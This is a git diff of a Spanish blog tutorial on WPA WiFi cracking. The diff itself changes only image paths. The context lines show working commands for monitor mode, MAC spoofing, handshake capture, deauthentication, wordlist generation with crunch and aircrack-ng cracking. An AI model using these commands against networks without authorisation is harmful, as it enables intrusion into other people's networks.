@@ -30,7 +30,7 @@ tags:
 - Hacking WiFi
 ---
 
-![](/assets/images/wifi/wallpapers.png)
+![](../assets/images/wifi/wallpapers.png)
 
 La idea de esta guía es comprobar la seguridad de una red wifi. 
 
@@ -49,7 +49,7 @@ apt install aircrak-ng macchanger
 El equipo que utilizo para este ejemplo es una Netbook de conectar igualdad.
 
 
-![](/assets/images/wifi/debian.png)
+![](../assets/images/wifi/debian.png)
 
 
 ## MODO MONITOR
@@ -64,14 +64,14 @@ Para poner la tarjeta WiFi en ""modo monitor" es necesario conocer el nombre de 
 ```bash
 sudo ifconfig
 ```
-![](/assets/images/wifi/ifconfig.png)
+![](../assets/images/wifi/ifconfig.png)
 
 Como se puede observar en la imagen, el nombre de mi interfaz es **wlp3s0** y para activar el "modo monitor" se debe ejecutar el siguiente comando:
 
 ```bash
 sudo airmon-ng start wlp3s0
 ```
-![](/assets/imagen/wifi/monitor.png)
+![](../assets/imagen/wifi/monitor.png)
 
 Ahora el nombre de la interfaz cambio a **wlp3s0mon**. Este nombre se debe a que la interfaz se encuentra en "modo monitor".
 
@@ -90,11 +90,11 @@ sudo ifconfig wlp3s0mon down
 sudo macchanger -a wlp3s0mon
 sudo ifconfig wlp3s0mon up
 ```
-![](/assets/images/wifi/macchanger.png)
+![](../assets/images/wifi/macchanger.png)
 
 Ahora que todo esta configurado correctamente es hora de analizar el trafico que pasa por el aire.
 
-![](/assets/images/wifi/airodump-ng.png)
+![](../assets/images/wifi/airodump-ng.png)
 
 * **PWR** hace referencia al "power". Cuanto mas bajo sea el valor, mejor es la señal que se recibe.
 
@@ -111,11 +111,11 @@ airodump-ng --channel 1 -w wifi-casa --bssid xx:xx:xx:xx wlp3s0mon
 * **- -bssid:** mac del router.
 * **wlp3s0mon:** nombre de la interfaz monitor.
 
-![](/assets/images/wifi/airodump-wifi-casa.png)
+![](../assets/images/wifi/airodump-wifi-casa.png)
 
 Dentro del directorio donde se esta ejecutando el ataque se crearon varios archivos, entre los cuales solo sera útil el que finaliza con extensión **.cap**.
 
-![](/assets/images/wifi/ls.png)
+![](../assets/images/wifi/ls.png)
 
 ## DES-AUTENTICACIÓN
 
@@ -131,7 +131,7 @@ La sintaxis del comando es:
 sudo aireplay-ng --deauth 4 -a ec:e4:xx:xx:xx:xx -c e4:g3:xx:xx:xx:xx wlp3s0mon
 ```
 
-![](/assets/images/wifi/deauth.png)
+![](../assets/images/wifi/deauth.png)
 
 Con esto se logra capturar el **HANDSHAKE**, al caul por medio de un diccionario de furza bruta se podrá obtener la clave de la red WiFi.
 
@@ -148,11 +148,11 @@ La sintaxis para crear un diccionario con **crunch** es la siguiente:
 crunch 8 8 0123456789 -t 36@@@@@@ -o diccionario
 ```
 
-![](/assets/images/wifi/diccionario.png)
+![](../assets/images/wifi/diccionario.png)
 
 El diccionario generado cuenta con miles de contraseñas de 8 dígitos.
 
-![](/assets/images/wifi/diccionario1.png)
+![](../assets/images/wifi/diccionario1.png)
 
 ## CRACKERAR
 
@@ -163,11 +163,11 @@ Para crackear el **HANDSHAKE** solo bastara con **aircrack-ng** y el tiempo que 
 ```bash
 sudo aircrack-ng wifi-casa-06.cap -w diccionario
 ```
-![](/assets/images/wifi/crack.png)
+![](../assets/images/wifi/crack.png)
 
 Clave obtenida.
 
-![](/assets/images/wifi/crack1.png)
+![](../assets/images/wifi/crack1.png)
 
 La velocidad de mi **CPU** es 517 claves por segundos y le tomo 25 segundos en poder descifrar la clave de la red WiFi.
 
